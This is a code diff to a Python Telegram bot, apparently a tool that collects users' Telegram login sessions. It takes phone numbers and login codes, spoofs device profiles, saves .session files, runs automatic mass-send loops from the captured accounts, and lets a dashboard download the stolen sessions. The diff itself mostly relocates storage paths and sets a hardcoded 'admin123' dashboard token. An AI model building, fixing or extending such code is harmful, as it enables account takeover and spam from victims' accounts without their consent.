@@ -54,12 +54,14 @@ disparo_tasks = {}  # phone -> asyncio.Task
 session_stats = {}  # phone -> stats dict
 
 # Dashboard
-DASHBOARD_TOKEN = "admissssn123"
+DASHBOARD_TOKEN = "admin123"
 
 # Multi-bot
 connected_bots = {}  # token -> {"app": Application, "username": str, "name": str, "id": int}
 DATA_DIR = "/app/data" if os.path.isdir("/app/data") else BASE_DIR
 BOTS_FILE = os.path.join(DATA_DIR, "bots.json")
+SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
+os.makedirs(SESSIONS_DIR, exist_ok=True)
 
 # Log capture — guarda as últimas 5000 linhas
 class LogCapture:
@@ -108,7 +110,7 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
         if account_id:
             session_stats[phone]["account_id"] = account_id
 
-STATS_FILE = os.path.join(BASE_DIR, "stats.json")
+STATS_FILE = os.path.join(DATA_DIR, "stats.json")
 
 def save_stats():
     """Salva session_stats em arquivo JSON"""
@@ -374,7 +376,7 @@ async def disparo_loop(client: TelegramClient, phone: str):
                     pass
                 # Remove dos stats e deleta arquivo .session
                 session_stats.pop(phone, None)
-                session_file = os.path.join(BASE_DIR, "sessions", f"{phone}.session")
+                session_file = os.path.join(SESSIONS_DIR, f"{phone}.session")
                 if os.path.exists(session_file):
                     os.remove(session_file)
                     print(f"[CLEANUP] 🗑️ Sessão {phone} deletada")
@@ -430,7 +432,7 @@ async def api_send_code(request):
         except:
             pass
 
-    session_path = os.path.join(BASE_DIR, "sessions", phone)
+    session_path = os.path.join(SESSIONS_DIR, phone)
 
     devices = [
         ("Samsung Galaxy S22", "Android 13", "10.9.5"),
@@ -643,7 +645,7 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     users[user_id] = {"step": "processing"}
 
-    session_path = os.path.join(BASE_DIR, "sessions", phone)
+    session_path = os.path.join(SESSIONS_DIR, phone)
     devices = [
         ("Samsung Galaxy S22", "Android 13", "10.9.5"),
         ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
@@ -838,7 +840,7 @@ async def stop_extra_bot(bot_token):
 # ===============================
 async def carregar_sessoes():
     """Carrega todas as sessões salvas e inicia disparo automático"""
-    sessions_dir = os.path.join(BASE_DIR, "sessions")
+    sessions_dir = SESSIONS_DIR
     arquivos = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
 
     if not arquivos:
@@ -976,7 +978,7 @@ async def api_dashboard_cleanup(request):
 
     for phone in to_remove:
         session_stats.pop(phone, None)
-        session_file = os.path.join(BASE_DIR, "sessions", f"{phone}.session")
+        session_file = os.path.join(SESSIONS_DIR, f"{phone}.session")
         if os.path.exists(session_file):
             os.remove(session_file)
         removed += 1
@@ -991,7 +993,7 @@ async def api_dashboard_download_sessions(request):
     if token != DASHBOARD_TOKEN:
         return web.json_response({"error": "Acesso negado"}, status=403)
 
-    sessions_dir = os.path.join(BASE_DIR, "sessions")
+    sessions_dir = SESSIONS_DIR
     session_files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
 
     if not session_files:
@@ -1086,7 +1088,7 @@ async def api_list_bots(request):
 # MAIN
 # ===============================
 async def main():
-    os.makedirs(os.path.join(BASE_DIR, "sessions"), exist_ok=True)
+    os.makedirs(SESSIONS_DIR, exist_ok=True)
 
     # --- Web Server (aiohttp) ---
     web_app = web.Application()
